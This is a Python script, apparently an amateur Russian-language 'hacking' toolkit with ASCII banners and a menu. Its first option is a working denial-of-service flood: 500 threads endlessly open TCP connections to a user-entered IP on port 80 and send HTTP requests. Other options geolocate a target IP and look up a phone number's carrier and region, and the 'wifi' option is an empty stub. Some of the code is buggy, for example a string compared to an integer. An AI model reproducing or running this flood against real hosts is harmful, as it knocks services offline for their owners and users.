import requests, fake_useragent
clear = lambda: os.system('cls')
from sys import argv
import time
import os
import socket
import shutil
import argparse
import requests
import random
import re
import threading
import argparse
import phonenumbers
import pyglet
piw = pyglet.resource.media("piw.wav")
piw1 = pyglet.resource.media("piw.wav")
piw2 = pyglet.resource.media("piw.wav")
from phonenumbers import geocoder, carrier
from color import *
clear()
piw.play()
piw1.play()
jls_extract_var = """

███████╗░██████╗██╗░░██╗░█████╗░██████╗░
██╔════╝██╔════╝██║░██╔╝██╔══██╗██╔══██╗
█████╗░░╚█████╗░█████═╝░██║░░██║██║░░██║
██╔══╝░░░╚═══██╗██╔═██╗░██║░░██║██║░░██║
██║░░░░░██████╔╝██║░╚██╗╚█████╔╝██████╔╝
╚═╝░░░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░
[1]-DDos
[2]-info number
[3]-ip info
[4]-wifi
"""
FEOLED(jls_extract_var)
jls_extract_var = input
select = jls_extract_var(":")
if select == '1':
	clear()
	dddsf = """

	██████╗░██████╗░░█████╗░░██████╗
	██╔══██╗██╔══██╗██╔══██╗██╔════╝
	██║░░██║██║░░██║██║░░██║╚█████╗░
	██║░░██║██║░░██║██║░░██║░╚═══██╗
	██████╔╝██████╔╝╚█████╔╝██████╔╝
	╚═════╝░╚═════╝░░╚════╝░╚═════╝░
	"""
	RED(dddsf)
	piw2.play()
	target = input('ip:')
	fake_ip = '182.21.20.32'
	port = 80
	def attack():
		while True:
		    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		    s.connect((target, port))
		    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		    s.close()
	for i in range(500):
		thread = threading.Thread(target=attack)
		thread.start()

if select == '2':
	clear()
	ne1 = '██╗███╗░░██╗███████╗░█████╗░███╗░░██╗██╗░░░██╗███╗░░░███╗'
	ne2 = '██║████╗░██║██╔════╝██╔══██╗████╗░██║██║░░░██║████╗░████║'
	ne3 = '██║██╔██╗██║█████╗░░██║░░██║██╔██╗██║██║░░░██║██╔████╔██║'
	ne4 = '██║██║╚████║██╔══╝░░██║░░██║██║╚████║██║░░░██║██║╚██╔╝██║'
	ne5 = '██║██║░╚███║██║░░░░░╚█████╔╝██║░╚███║╚██████╔╝██║░╚═╝░██║'
	ne6 = '╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚════╝░╚═╝░░╚══╝░╚═════╝░╚═╝░░░░░╚═╝'
	GREEN(ne1)
	GREEN(ne2)
	GREEN(ne3)
	GREEN(ne4)
	GREEN(ne5)
	GREEN(ne6)
	jlds = """
	[1]-num info 1.0v
	[2]-num info 2.0v
	"""
	print(jlds)
	jls_extract_var = input
	select = jls_extract_var(":")
	if select == 1:
		print('ведити номер телефона с +')
		r = input()
		x = phonenumbers.parse(r)
		valid = phonenumbers.is_valid_number(x)
		prosible = phonenumbers.is_possible_number(x)
		xg = carrier.name_for_number(x, 'ru')
		region = geocoder.description_for_number(x, 'ru')
		if prosible == 'False':
			print('[-]нет такого номера')
		elif valid == 'False':
			print('[-]этот номер не существует')
		elif valid == 'False' or prosible == 'False':
			print('[-]неправильный номер')
		else:
			print('[+]номер:', x)
			print('[+]оператор:', xg)
			print('[+]страна:', region)
if select == '3':
	clear()
	nn1 = '██╗███╗░░██╗███████╗░█████╗░██╗██████╗░'
	nn2 = '██║████╗░██║██╔════╝██╔══██╗██║██╔══██╗'
	nn3 = '██║██╔██╗██║█████╗░░██║░░██║██║██████╔╝'
	nn4 = '██║██║╚████║██╔══╝░░██║░░██║██║██╔═══╝░'
	nn5 = '██║██║░╚███║██║░░░░░╚█████╔╝██║██║░░░░░'
	nn6 = '╚═╝╚═╝░░╚══╝╚═╝░░░░░░╚════╝░╚═╝╚═╝░░░░░'
	GREEN(nn1)
	GREEN(nn2)
	GREEN(nn3)
	GREEN(nn4)
	GREEN(nn5)
	GREEN(nn6)
	jls_extract_var = """
	[1]ip address(URL)	
	[2]IP address info
	"""
	print(jls_extract_var)
	jls_extract_var = input
	select = jls_extract_var(":")
	if select == '1':
		def get_ip_by_hostname():
			hostname = input('ip address(URL):')

			try:
				return f'Hostname: {hostname}\nIP address: {socket.gethostbyname(hostname)}'
			except socket.gaierror as error:
				return f'Invalid Hostname - {error}'
		def main():
			print(get_ip_by_hostname())

		if __name__ == '__main__':
			main()
	if select == '2':
		def get_info_by_ip(ip='127.0.0.1'):
			try:
				response = requests.get(url=f'http://ip-api.com/json/{ip}').json()
				data = {
				'[IP]': response.get('query'),
				'[Int prov]': response.get('isp'),
				'[Org]': response.get('org'),
				'[Country]': response.get('country'),
				'[Region Name]': response.get('regionName'),
				'[City]': response.get('city'),
				'[ZIP]': response.get('zip'),
				'[Lat]': response.get('lat'),
				'[Lon]': response.get('lon')
				}

				for k, v in data.items():
					print(f'{k} : {v}')
			except requests.exceptions.ConnectionError:
				print('[!] Please check your connection!')
		def main():	
			ip = input('Please enter a target IP:')

			get_info_by_ip(ip=ip)

		if __name__ == '__main__':
			main()
if select == '4':
	clear()
	nbn = """

	░██╗░░░░░░░██╗██╗░░░░░░███████╗██╗
	░██║░░██╗░░██║██║░░░░░░██╔════╝██║
	░╚██╗████╗██╔╝██║█████╗█████╗░░██║
	░░████╔═████║░██║╚════╝██╔══╝░░██║
	░░╚██╔╝░╚██╔╝░██║░░░░░░██║░░░░░██║
	░░░╚═╝░░░╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝
	"""
	RED(nbn)